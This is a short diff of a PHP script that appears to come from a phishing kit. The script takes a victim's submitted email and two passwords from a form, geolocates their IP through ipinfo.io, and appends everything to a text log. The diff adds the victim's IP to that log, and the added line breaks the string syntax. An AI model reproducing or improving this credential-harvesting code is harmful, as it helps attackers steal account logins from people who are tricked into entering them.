@@ -6,6 +6,7 @@ $userp = $_SERVER['REMOTE_ADDR'];
 
 $cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
+$ip = getRealIP();
 	
 	$file = fopen("NEW01.txt", "a");
 	
@@ -13,6 +14,7 @@ fwrite($file,
 "* EMAIL: ".$_POST['email']."
 * PASS: ".$_POST['pass']."
 * PASS1: ".$_POST['pass1']."
+* Ip: $ip";
 * F-H-IP-P-C: 
 ".date('Y-m-d')."
 ".date('H:i:s')."
